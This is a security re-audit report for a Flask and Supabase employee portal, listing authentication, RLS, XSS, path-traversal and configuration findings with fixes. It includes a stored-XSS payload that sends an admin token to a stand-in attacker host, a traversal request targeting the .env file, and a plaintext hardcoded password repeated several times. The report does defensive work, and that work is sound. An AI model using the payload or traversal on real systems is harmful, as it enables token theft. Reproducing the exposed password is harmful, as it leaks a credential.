# OTSi ESS Portal security audit

**Scope:** Static review of the Flask API (`app.py`), frontend (`otsi-attendance-portal.html`), authentication module (`auth.py`), database schema, Docker configuration, and dependency manifest on **2026-08-11**. This is an updated re-audit following the 2026-08-04 initial audit and subsequent project cleanup. No production Supabase instance, deployed headers, Git history, or external dependency vulnerability database was available for verification.

## Changes since 2026-08-04 audit

The following items have been completed since the initial audit:
- ✅ Historical credential helper scripts (`create_super_admin.py`, `tmp_super_admin_test.py`) deleted — removes two hardcoded-credential vectors.
- ✅ `MIGRATION_INSTRUCTIONS.py` and other obsolete one-time setup scripts removed.
- ✅ Scratch directories and transcript dumps removed from repository.

The following **critical** findings **remain unresolved** and are re-confirmed below.

---

## Launch readiness scorecard

| # | Check | 2026-08-04 | 2026-08-11 | Change |
|---|---|---|---|---|
| 1 | Privacy and legal | UNVERIFIED | UNVERIFIED | — |
| 2 | Authentication | CRITICAL | CRITICAL | — |
| 3 | Authorization / RLS | CRITICAL | CRITICAL | — |
| 4 | Server-side validation | HIGH | HIGH | — |
| 5 | Error handling | HIGH | HIGH | — |
| 6 | Security headers | CRITICAL | CRITICAL | — |
| 7 | OWASP Top 10 (XSS) | CRITICAL | CRITICAL | — |
| 8 | Data leak audit | CRITICAL | IMPROVED | ⬆ helper scripts deleted |
| 9 | API-key exposure | HIGH | HIGH | — |
| 10 | Environment variables | CRITICAL | CRITICAL | — |
| 11 | Rate limiting and cost | HIGH | HIGH | — |
| 12 | CAPTCHA and CORS | HIGH | HIGH | — |
| 13 | Dependency security | UNVERIFIED | UNVERIFIED | — |
| 14 | Logging and monitoring | MEDIUM | MEDIUM | — |
| 15 | File upload security | PASS | PASS | — |
| 16 | AI-specific security | PASS | PASS | — |
| 17 | Production configuration | CRITICAL | CRITICAL | — |

**Score:** 2/17 checks passed (two checks not applicable). Score improvement: 0 since the previous audit.
**Verdict: DO NOT LAUNCH** until the critical findings are fixed, secrets are rotated, and the deployed Supabase/RLS configuration is verified.

---

## Findings

### 1. Privacy and legal — UNVERIFIED *(unchanged)*
**Finding:** No privacy policy, terms, retention policy, or data-subject request workflow found.

**Fix:** Publish and link privacy/terms pages from the login and footer. Obtain legal review for applicable jurisdictions.

---

### 2. Authentication — CRITICAL *(unchanged)*

**Finding A — token substitution (line 762 & 592):**
`reset-expired-password` (app.py:762) calls `AuthUtils.verify_token(temp_token)` but **never checks that the token's `employee_id` claim matches the `employee_id` in the request body**. The same flaw is confirmed in `mfa-verify` (app.py:592). An authenticated employee can pair their own valid access token with another employee's ID to reset that employee's password or pass MFA.

```python
# app.py:760-764 — current code (VULNERABLE)
try:
    AuthUtils.verify_token(temp_token)       # ← only checks signature/expiry
except Exception as te:
    return jsonify({'error': f'Session expired or invalid: {str(te)}'}), 401
# employee_id in the request body is never compared to token claims!
```

**Fix:** Bind tokens to employee and purpose:
```python
payload = AuthUtils.verify_token(temp_token)
if payload.get('employee_id') != employee_id or payload.get('purpose') != 'expired-password-reset':
    return jsonify({'error': 'Invalid session'}), 401
```

**Finding B — password policy disabled (auth.py:33-82):**
`validate_password_policy` is deliberately commented out. Only 8–64 character length is enforced, allowing trivially weak passwords.

**Fix:** Uncomment and restore the policy checks. Minimum 12-character length recommended.

**Finding C — password history disabled (auth.py:88-104):**
`check_password_history` is also commented out — users can immediately re-use their old password.

**Fix:** Restore the password history check for the last 5 passwords.

**Finding D — reset enumeration (app.py:876):**
`forgot-password` returns `404` with `"No employee found with this email address."` for unknown emails.

**Fix:** Return `200` with a generic message regardless of whether the email exists.

**Finding E — MFA code plaintext in console (app.py:515):**
```python
print(f"\n[SECURITY] MFA Verification Code for {employee['employee_id']}: {mfa_code}\n", flush=True)
```
MFA codes are printed to stdout (server logs). Anyone with log access can hijack active MFA sessions.

**Fix:** Remove this print statement entirely in production.

---

### 3. Authorization / RLS — CRITICAL *(unchanged)*
**Finding:** Both schema files (`database_schema.sql`, `ess_portal_schema_standalone.sql`) still contain **no `ENABLE ROW LEVEL SECURITY`** or RLS policies. The backend uses a single undifferentiated Supabase key.

**Fix:**
```sql
ALTER TABLE public.employees ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.attendance_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.leave_balance ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.leave_applications ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.timesheets ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.support_tickets ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.notifications ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.audit_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.password_history ENABLE ROW LEVEL SECURITY;
```
Use `SUPABASE_SERVICE_ROLE_KEY` (backend-only) and add per-table policies that prevent any client from accessing `password_hash`, MFA fields, or audit data.

---

### 4. Server-side validation — HIGH *(unchanged)*
**Finding:** Endpoints pass arbitrary client values to the database without schema validation, max-length checks, or enum constraints (tickets, profile updates, ticket status, correction comments).

**Fix:** Add a validation schema per endpoint (Pydantic or Marshmallow). Reject unknown fields, cap all text fields, and enforce enum values for status/priority/leave-type.

---

### 5. Error handling — HIGH *(unchanged)*
**Finding:** Login error handler (app.py:550-554) returns the raw exception string and calls `traceback.print_exc()`:
```python
except Exception as e:
    logger.error(f"Login error: {str(e)}", exc_info=True)
    import traceback
    traceback.print_exc()
    return jsonify({'error': f'Login failed: {str(e)}'}), 500   # ← exposes internals
```

**Fix:** Return a generic `'Login failed'` message to the client. Keep full exception in server logs only. Remove `traceback.print_exc()`.

---

### 6. Security headers / path traversal — CRITICAL *(unchanged)*

**Finding A — path traversal (app.py:58-62):**
```python
@app.route('/images/<path:filename>', methods=['GET'])
def serve_image(filename):
    images_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'images'))
    return send_file(os.path.join(images_dir, filename))   # ← VULNERABLE
```
A request to `/images/../ESS_Backend/.env` can traverse outside the `images/` directory.

**Fix:**
```python
from flask import send_from_directory, abort
from pathlib import Path

@app.route('/images/<path:filename>', methods=['GET'])
def serve_image(filename):
    if Path(filename).suffix.lower() not in {'.png', '.jpg', '.jpeg', '.svg', '.webp'}:
        abort(404)
    images_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'images'))
    return send_from_directory(images_dir, filename, conditional=True)
```

**Finding B — no browser security headers:**
No CSP, HSTS, `X-Content-Type-Options`, `X-Frame-Options`, Referrer-Policy, or Permissions-Policy is configured anywhere in the Flask app.

**Fix:** Add a Flask `after_request` function:
```python
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com;"
    return response
```

---

### 7. OWASP Top 10 — CRITICAL *(unchanged)*
**Finding:** Stored XSS vectors in `otsi-attendance-portal.html` remain. User-controlled values are interpolated via `innerHTML` (correction reasons, notification titles/messages, ticket subject/description, leave details).

**Attack:** An employee submits `<img src=x onerror=fetch('https://attacker.com?t='+localStorage.token)>` in a ticket field. When admin loads the page, the script executes and exfiltrates the admin bearer token.

**Fix:** Replace all `innerHTML` interpolations of API data with `textContent` or safe DOM node construction. Consider DOMPurify for any genuinely rich-text fields.

---

### 8. Data-leak audit — IMPROVED *(partially resolved)*
**Resolved:** `create_super_admin.py` (had hardcoded `R@vikiran332!`), `tmp_super_admin_test.py` (had hardcoded credentials + test login), deleted from repository on 2026-08-07.

**Still present:** `reset_employee_password.py:18` still has the default credential:
```python
password = sys.argv[2] if len(sys.argv) > 2 else 'R@vikiran332!'
```

> [!WARNING]
> **Immediate action required:** If this password (`R@vikiran332!`) was used in any environment (including local dev or staging), it must be rotated immediately on all affected accounts. The credential has also been stored in conversation history/logs.

**Fix:** Remove the default value. Require the password argument to be provided explicitly:
```python
if len(sys.argv) < 3:
    print("Usage: python reset_employee_password.py <EMPLOYEE_ID> <NEW_PASSWORD>")
    sys.exit(1)
password = sys.argv[2]
```

---

### 9. API-key exposure — HIGH *(unchanged)*
**Finding:** `SUPABASE_KEY` privilege level is undetermined. With RLS absent, an anon key gives broad database access.

**Fix:** Rename to `SUPABASE_SERVICE_ROLE_KEY`, keep it server-only, rotate after RLS review.

---

### 10. Environment variables — CRITICAL *(unchanged)*
**Finding:** `auth.py:117, 133, 143` uses fallback `'your-secret-key'` for `JWT_SECRET_KEY`. `docker-compose.yml` sets `FLASK_ENV: development`, `FLASK_DEBUG: True`.

**Fix:** Fail at startup if `JWT_SECRET_KEY` is missing or is the placeholder. Use at least 32 bytes of random entropy.

---

### 11. Rate limiting — HIGH *(unchanged)*
**Finding:** No rate limiter on login, MFA, forgot-password, reset, register, or refresh routes.

**Fix:** Add Flask-Limiter (Redis backend): 5–10 attempts/minute on login/MFA, 3–5 per hour on reset/register.

---

### 12. CAPTCHA and CORS — HIGH *(unchanged)*
**Finding:** `CORS(app, resources={r"/api/*": {"origins": "*"}})` — wildcard CORS allows any origin.

**Fix:** Use a comma-separated `CORS_ORIGINS` environment variable; reject unlisted origins.

---

### 13. Dependency security — UNVERIFIED *(unchanged)*
**Finding:** No `pip-audit` scan run. Python 3.9 (Dockerfile) is an aging runtime.

**Fix:** Add `pip-audit -r requirements.txt` to CI; upgrade to Python 3.11 or 3.12.

---

### 14. Logging and monitoring — MEDIUM *(unchanged)*
**Finding:** MFA codes are printed to console (app.py:515). Structured security event logging is incomplete. Reset link also printed to console at app.py:886-900.

**Fix:** Remove all secret/code console logs. Implement structured security event logging with correlation IDs.

---

### 15. File upload security — PASS *(unchanged)*
No server-side upload endpoint found.

---

### 16. AI-specific security — PASS *(unchanged)*
No AI/RAG integration found.

---

### 17. Production configuration — CRITICAL *(unchanged)*
**Finding:** Development admin bootstrap endpoints remain unconditionally registered:
- `/api/dev/create-super-admin` (app.py:316–383)
- `/api/dev/bootstrap-otsi-admin` (app.py:386–404)

Both rely only on `remote_addr` for access control, which is unreliable behind a reverse proxy. `docker-compose.yml` still has `FLASK_DEBUG: True`.

**Fix:** Guard with `FLASK_ENV == 'development'` check, or remove from production code entirely.

---

## Prioritized action list

### Critical — fix before launch
1. **Rotate** the `R@vikiran332!` credential if used anywhere. Remove the hardcoded default from `reset_employee_password.py:18`.
2. **JWT fallback secret** — fail startup if `JWT_SECRET_KEY` is missing or placeholder.
3. **Path traversal** — fix `/images/<path:filename>` with `send_from_directory` + extension allowlist.
4. **Token binding** — verify `employee_id` and `purpose` claims in `mfa-verify` and `reset-expired-password`.
5. **Supabase RLS** — enable on all sensitive tables; verify no client policy accesses password/MFA/audit data.
6. **Dev endpoints** — disable `/api/dev/*` in production.
7. **XSS** — eliminate `innerHTML` interpolation of user-controlled values.

### High — fix immediately after critical items
1. Restore password policy and history checks in `auth.py`.
2. Remove raw exception details from login/token-verify responses and `traceback.print_exc()`.
3. Remove MFA code `print()` statement (app.py:515) and reset link console log.
4. Add security headers (`X-Content-Type-Options`, `X-Frame-Options`, CSP, Referrer-Policy).
5. Restrict CORS to known production origins.
6. Add Redis-backed rate limiting on auth routes.
7. Return generic 200 response from `forgot-password` regardless of email existence.

### Medium / low
- Structured security event logging and alerting.
- Dependency scan in CI; upgrade Python base image to 3.11+.
- Privacy / retention / legal documentation.

---

## What is already solid

- Passwords use Werkzeug's `generate_password_hash` (not plaintext storage).
- Primary API routes require a valid bearer token.
- Several resource endpoints scope database queries to `g.current_employee_id`.
- The normal email password-reset flow invalidates the link after use.
- `create_super_admin.py` and `tmp_super_admin_test.py` (hardcoded credentials) have been deleted.
- Account lockout (`lockout_until`) and failed login counter (`failed_login_attempts`) are implemented.
- Audit logging (`log_audit`) is called at key events.

---

## AI coding prompts

> You are a security engineer working on a Flask + Supabase employee portal. In `ESS_Backend/app.py` and `auth.py`, replace the current generic JWT temporary tokens with purpose-bound, employee-bound, one-time action tokens for MFA verification and expired-password reset. The endpoint must reject a token if its `sub`/employee ID or `purpose` does not exactly match the request, use a cryptographically secure MFA code, hash the code at rest, and atomically consume it after success. Preserve the existing normal password-reset flow and add tests for cross-user token substitution.

> Review `ESS_Backend/app.py` and `otsi-attendance-portal.html` for security hardening. Fix the `/images/<path:filename>` path traversal with `send_from_directory` and an image extension allowlist. Remove all `innerHTML` interpolations that include API/user data, rebuilding those views with `textContent`. Add a restrictive `Content-Security-Policy` header and remove inline event handlers.

> Harden this Flask deployment for production. Make startup fail if `JWT_SECRET_KEY`, `SUPABASE_URL`, or `SUPABASE_KEY` are missing or placeholder values. Remove default secrets. Guard `/api/dev/*` endpoints behind an explicit development-mode flag. Configure a strict CORS allowlist, security headers, and Redis-backed rate limits for login, MFA, registration, password-reset, and refresh routes. Provide a production `docker-compose.yml` with debug disabled and no source-code bind mount.
